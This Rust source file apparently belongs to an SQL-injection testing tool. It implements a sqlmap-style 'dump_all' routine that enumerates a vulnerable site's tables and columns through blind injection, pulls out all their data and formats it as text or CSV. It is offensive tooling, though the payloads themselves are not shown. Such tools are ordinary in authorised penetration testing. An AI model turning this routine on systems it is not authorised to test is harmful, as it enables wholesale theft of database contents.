//! dump-all orchestrator: schema enumeration → full column-by-column data extraction.
//!
//! Equivalent to `sqlmap --dump-all`. Flow:
//!   1. `enumerate_full_schema`  — discover all tables + their columns
//!   2. For every (table, column) pair: `extract_data_blind`
//!   3. Return columnar data aligned by row index into `DumpAllResult`

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;
use anyhow::Result;
use serde::Serialize;
use tracing::info;

use crate::sqx::{
    detector::SqliDetector,
    models::{
        BlindExtractionConfig, BlindTechnique, CancellationToken,
        SchemaEnumerationConfig, SchemaEnumerationProgress,
    },
};

/// Full dump result returned by [`SqliDetector::dump_all`].
#[derive(Debug, Serialize)]
pub struct DumpAllResult {
    /// Tables discovered (in enumeration order).
    pub tables: Vec<String>,
    /// Columns per table (in enumeration order).
    pub columns: HashMap<String, Vec<String>>,
    /// Extracted data: table → column → values (aligned by row index).
    pub data: HashMap<String, HashMap<String, Vec<String>>>,
    pub total_requests: usize,
    pub elapsed_secs: f64,
}

impl DumpAllResult {
    /// Render as CSV-like text tables (one block per table).
    pub fn to_text(&self) -> String {
        let mut out = String::new();
        for table in &self.tables {
            let cols = match self.columns.get(table) {
                Some(c) if !c.is_empty() => c,
                _ => continue,
            };
            let table_data = match self.data.get(table) {
                Some(d) => d,
                None => continue,
            };

            let row_count = cols.iter()
                .filter_map(|c| table_data.get(c))
                .map(|v| v.len())
                .max()
                .unwrap_or(0);

            if row_count == 0 { continue; }

            out.push_str(&format!("\n[TABLE: {}]\n", table));
            out.push_str(&cols.join(" | "));
            out.push('\n');
            out.push_str(&"-".repeat(cols.join(" | ").len()));
            out.push('\n');

            for row_idx in 0..row_count {
                let row: Vec<String> = cols.iter().map(|col| {
                    table_data.get(col)
                        .and_then(|vals| vals.get(row_idx))
                        .cloned()
                        .unwrap_or_else(|| "NULL".to_string())
                }).collect();
                out.push_str(&row.join(" | "));
                out.push('\n');
            }
        }
        out
    }

    /// Render as CSV (one file per table, separated by blank lines + header).
    pub fn to_csv(&self) -> String {
        let mut out = String::new();
        for table in &self.tables {
            let cols = match self.columns.get(table) {
                Some(c) if !c.is_empty() => c,
                _ => continue,
            };
            let table_data = match self.data.get(table) {
                Some(d) => d,
                None => continue,
            };

            let row_count = cols.iter()
                .filter_map(|c| table_data.get(c))
                .map(|v| v.len())
                .max()
                .unwrap_or(0);

            if row_count == 0 { continue; }

            out.push_str(&format!("# {}\n", table));
            out.push_str(&cols.join(","));
            out.push('\n');

            for row_idx in 0..row_count {
                let row: Vec<String> = cols.iter().map(|col| {
                    let val = table_data.get(col)
                        .and_then(|vals| vals.get(row_idx))
                        .cloned()
                        .unwrap_or_else(|| String::new());
                    // Quote values containing commas or quotes
                    if val.contains(',') || val.contains('"') {
                        format!("\"{}\"", val.replace('"', "\"\""))
                    } else {
                        val
                    }
                }).collect();
                out.push_str(&row.join(","));
                out.push('\n');
            }
            out.push('\n');
        }
        out
    }
}

impl SqliDetector {
    /// Dump all data from a confirmed vulnerable endpoint.
    ///
    /// # Parameters
    /// - `url` — target URL with the vulnerable parameter in the query string
    /// - `param` — name of the injectable parameter
    /// - `original_value` — benign value for that parameter (used as baseline)
    /// - `dbms` — DBMS identifier: `"mysql"`, `"postgresql"`, `"mssql"`, `"oracle"`, `"sqlite"`
    /// - `technique` — `BlindTechnique::Boolean` or `BlindTechnique::Time`
    /// - `max_rows` — row cap per column (safety valve against huge tables)
    /// - `cancel_token` — optional cancellation token
    pub async fn dump_all(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        technique: BlindTechnique,
        max_rows: usize,
        cancel_token: Option<CancellationToken>,
    ) -> Result<DumpAllResult> {
        let start = Instant::now();
        let mut total_requests = 0usize;

        let baseline = self.send_request(url).await?;

        // ── Phase 1: schema enumeration ──────────────────────────────────────
        let schema_cfg = SchemaEnumerationConfig {
            technique,
            max_tables: 100,
            max_columns_per_table: 50,
            max_name_length: 64,
        };

        let progress_cb: Option<Arc<dyn Fn(SchemaEnumerationProgress) + Send + Sync>> =
            Some(Arc::new(|p: SchemaEnumerationProgress| {
                eprintln!(
                    "[dump] schema/{} — {} items ({} reqs so far)",
                    p.phase, p.items_found, p.total_requests
                );
            }));

        info!("dump_all: enumerating schema for DBMS={}", dbms);
        let schema = self
            .enumerate_full_schema(
                url, param, original_value, dbms, &schema_cfg,
                &baseline, progress_cb, cancel_token.clone(),
            )
            .await?;

        let tables = schema.tables.clone();
        let columns = schema.columns.clone();

        eprintln!(
            "[dump] schema done — {} table(s): {}",
            tables.len(),
            tables.join(", ")
        );

        // ── Phase 2: data extraction ─────────────────────────────────────────
        let mut data: HashMap<String, HashMap<String, Vec<String>>> = HashMap::new();

        'tables: for table in &tables {
            if cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                break 'tables;
            }

            let table_cols = match columns.get(table) {
                Some(c) if !c.is_empty() => c.clone(),
                _ => {
                    eprintln!("[dump] skipping {} — no columns", table);
                    continue;
                }
            };

            let mut col_data: HashMap<String, Vec<String>> = HashMap::new();

            for col in &table_cols {
                if cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false) {
                    break;
                }

                eprintln!("[dump] extracting {}.{}", table, col);

                let extraction_cfg = BlindExtractionConfig {
                    target_table: table.clone(),
                    target_column: col.clone(),
                    custom_query: None,
                    where_clause: None,
                    max_rows,
                    max_length_per_value: 256,
                    technique,
                };

                match self
                    .extract_data_blind(
                        url, param, original_value,
                        &extraction_cfg, &baseline,
                        None, cancel_token.clone(),
                    )
                    .await
                {
                    Ok(result) => {
                        total_requests += result.total_requests;
                        eprintln!(
                            "[dump]   → {} value(s) in {} reqs",
                            result.extracted_values.len(), result.total_requests
                        );
                        col_data.insert(col.clone(), result.extracted_values);
                    }
                    Err(e) => {
                        eprintln!("[dump] error extracting {}.{}: {}", table, col, e);
                        col_data.insert(col.clone(), vec!["<error>".to_string()]);
                    }
                }
            }

            data.insert(table.clone(), col_data);
        }

        let elapsed_secs = start.elapsed().as_secs_f64();
        eprintln!(
            "[dump] complete — {} table(s), {} total requests, {:.1}s",
            tables.len(), total_requests, elapsed_secs
        );

        Ok(DumpAllResult { tables, columns, data, total_requests, elapsed_secs })
    }
}
